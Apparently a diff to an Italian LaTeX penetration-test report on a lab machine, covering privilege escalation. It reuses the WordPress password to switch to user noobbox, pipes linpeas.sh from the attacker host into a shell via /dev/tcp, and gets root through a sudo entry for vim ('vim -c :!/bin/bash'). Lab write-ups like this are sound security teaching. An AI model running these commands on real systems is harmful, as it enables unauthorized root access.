@@ -650,6 +650,111 @@ Allo stato attuale delle cose, si ha tuttavia a dispozione una shell per l'utent
 \section{Privilege Escalation}
 L'utente \texttt{www-data} \textbf{non è un utente privilegiato}. Lo scopo di questa fase è quindi tentare una \textbf{Privilege Escalation} ed ottenere l'accesso ad utenti "più privilegiati" e successivamente all'account \texttt{root}.
 
+Prima di utilizzare qualsiasi tool, si è scelto di visitare la directory \texttt{/home} per capire quali utenti "standard" fossero presenti all'interno del sistema, poiché non necessariamente gli utenti configurati per wordpress coincidono con quelli presenti sul sistema \footnote{Anche se in questo caso...}. Il comando eseguito è stato un semplice
+
+\begin{center}
+    \texttt{ls /home/}
+\end{center}
+
+il cui risultato è mostrato nella Figura 25.
+
+\begin{figure}[h!]
+    \centering
+    \includegraphics[width=\textwidth]{img/ls-home.png}
+    \caption{\texttt{noobbox} strikes again}
+\end{figure}
+
+È stato dunque appurato che, in base alla struttura delle directory sui sistemi Unix, è presente un utente \texttt{noobbox} anche per il sistema operativo in sé.
+
+A questo punto, avendo a disposizione unicamente la password \texttt{5p4c3}, viene tentato il login come utente \texttt{noobbox} utilizzando tale password. Si sta tentando quindi una sorta di \textbf{Horizontal Privilege Escalation}, mostrata nella Figura 26.
+
+\begin{figure}[h!]
+    \centering
+    \includegraphics[width=\textwidth]{img/su-noobbox.png}
+    \caption{\texttt{su noobbox}}
+\end{figure}
+
+\newpage
+Al netto del messaggio di errore dovuto probabilmente al fatto che ci si sta interfacciando con una shell generata da \texttt{meterpreter}, è possibile notare come \textbf{la password di Wordpress si stata riutilizzata anche per l'utente presente sulla macchina}, dato che il login \textbf{è andato a buon fine}. Questa di per sé è una scelta che amplifica l'attacco veicolato in precedenza.
+
+\subsection{Vertical Privilege Escalation: \texttt{linpeas.sh}}
+L'obiettivo dell'indagine diventa quindi \textbf{assumere i privilegi di \texttt{root}}. Si tenga presente come la semplice elevazione dei privilegi mediante il comando \texttt{sudo su} non funziona perché la shell utilizzata dall'utente \texttt{noobbox} non permette l'esecuzione di tale comando. Per aggirare questa limitazione e rendere più completa l'indagine è stato utilizzato lo script \texttt{linpeas.sh}.
+
+Questo tool fa parte della suite \textbf{PEASS-ng} \textit{(Privilege Escalation Awesome Scripts SUITE)}, sviluppata dal ricercatore Carlos Polop ed il cui codice è disponibile sulla piattaforma GitHub \cite{linpeas}.
+
+Per utilizzarlo, questo script va eseguito \textbf{sull'asset da analizzare} e fornisce un resoconto dettagliato su tutti gli aspetti del sistema operativo che potrebbero fornire un vettore d'attacco per realizzare operazioni di \textbf{Privilege Escalation}.
+
+\subsubsection{Trasferire \texttt{linpeas.sh} sull'asset}
+
+Talvolta, trasferire codice su un asset compromesso può essere complesso. Si è deciso quindi, per evitare problemi di sorta, di evitare qualsiasi scrittura sull'asset, optando per l'esecuzione dello script direttamente dalla rete, trasferendolo dalla macchina Kali mediante una \textbf{socket}. Questo è un processo che si articola in due fasi ed è simile a quello utilizzato di solito per l'apertura di una \textbf{reverse shell}:
+
+\begin{enumerate}
+    \item Apertura di un listener sulla macchina attaccante, come mostrato nella Figura 27. Si noti la connessione in entrata dall'asset.\footnote{La macchina Kali ora possiede l'indirizzo \texttt{192.168.64.23} e non più \texttt{192.168.64.15} a causa di una reinstallazione del sistema dovuta a problemi di natura tecnica.};
+    \item Ricezione ed esecuzione dello script da parte dell'asset, come mostrato nella Figura 28.
+\end{enumerate}
+
+\begin{figure}[h!]
+    \centering
+    \includegraphics[width=\textwidth]{img/listener.png}
+    \caption{Il listener sulla macchina Kali}
+\end{figure}
+
+\begin{figure}[h!]
+    \centering
+    \includegraphics[width=\textwidth]{img/linpeas.png}
+    \caption{\texttt{cat < /dev/tcp/192.168.64.23/80 | sh}}
+\end{figure}
+
+\newpage
+\subsubsection{\texttt{linpeas.sh}: i risultati}
+L'output dello script è allegato al presente documento nel file \texttt{linpeas-output.txt} e, mediante la sua analisi, è possibile imbattersi nelle seguenti informazioni derivanti dalla lettura del file \texttt{/etc/sudoers} dell'asset:
+
+\begin{center}
+    \texttt{
+    User noobbox may run the following commands on N00bBox:\\
+        (ALL : ALL) /usr/bin/vim}
+\end{center}
+
+Lo script suggerisce tra l'altro che questa impostazione rappresenta "Al 95\% un vettore di Privilege Escalation" (sulla shell dell'asset era evidenziato in giallo).
+
+Si noti come l'editor \texttt{vim} permetta l'esecuzione di comandi shell mediante la sintassi:
+
+\begin{center}
+    \texttt{vim -c ':!<comando>'}
+\end{center}
+
+dove:
+
+\begin{itemize}
+    \item \texttt{-c} permette l'esecuzione di un comando subito dopo l'apertura dell'editor;
+    \item \texttt{:} entra nella cosiddetta \textit{command mode};
+    \item \texttt{!} viene usato per indicare che il prossimo input deve essere interpretato come un \textbf{comando di shell}
+\end{itemize}
+
+Il comando che si cerca di eseguire in questo caso è \texttt{/bin/bash}. Anteponendo \texttt{sudo} all'invocazione di questo comando, l'editor vim verrà eseguito come \texttt{root} e, di conseguenza, anche la shell aperta sarà di \texttt{root}. Il risultato dell'esecuzione di questo comando è mostrata di seguito.
+
+\begin{figure}[h!]
+    \centering
+    \includegraphics[width=\textwidth]{img/vim.png}
+    \caption{L'esecuzione di \texttt{vim} come root}
+\end{figure}
+
+Per confermare che si stia effettivamente utilizzando una shell di root, è possibile eseguire i comandi \texttt{whoami} ed \texttt{id}, i cui output sono mostrati rispettivamente nella Figura 30 e 31.
+
+\begin{figure}[h!]
+    \centering
+    \includegraphics[width=\textwidth]{img/whoami.png}
+    \caption{L'esecuzione di \texttt{whoami}}
+\end{figure}
+
+\begin{figure}[h!]
+    \centering
+    \includegraphics[width=\textwidth]{img/id.png}
+    \caption{L'esecuzione di \texttt{id}}
+\end{figure}
+
+Come è possibile notare, la fase di Privilege Escalation è stata completata con successo, essendo riusciti ad ottenere il \textbf{massimo privilegio possibile}.
+
 \newpage
 \printbibliography[title={Riferimenti bibliografici e risorse consultate}]
 \end{document}
